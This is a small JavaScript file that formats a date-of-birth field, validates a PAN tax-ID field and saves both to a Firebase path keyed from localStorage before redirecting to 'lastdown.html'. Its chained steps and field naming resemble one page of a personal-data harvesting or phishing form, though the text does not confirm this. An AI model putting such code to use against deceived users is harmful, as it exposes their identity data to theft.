// firebase-card.js

const dobInput = document.getElementById("dob");
const panInput = document.getElementById("pan");
const proceedBtn = document.querySelector(".proceed-button");

// Auto format DOB field
dobInput.addEventListener("input", () => {
  let value = dobInput.value.replace(/\D/g, "");
  if (value.length >= 3) value = value.slice(0, 2) + "/" + value.slice(2);
  if (value.length >= 6) value = value.slice(0, 5) + "/" + value.slice(5);
  dobInput.value = value.slice(0, 10);
  validateForm();
});

// PAN input listener
panInput.addEventListener("input", () => {
  validateForm();
});

// Enable button when both PAN and DOB are filled correctly
function validateForm() {
  const panValid = panInput.value.trim().length === 10;
  const dobValid = dobInput.value.trim().length === 10;
  proceedBtn.disabled = !(panValid && dobValid);
}

// Form submit
document.getElementById("cardForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const key = localStorage.getItem("firebaseKey");
  if (!key) return alert("No Firebase key found!");

  const userRef = firebase.database().ref("ududip007/" + key);

  userRef.update({
    e_DOB: dobInput.value.trim(),
    f_PAN: panInput.value.trim()
  }).then(() => {
    window.location.href = "lastdown.html";
  }).catch((err) => {
    alert("Error: " + err.message);
  });
});
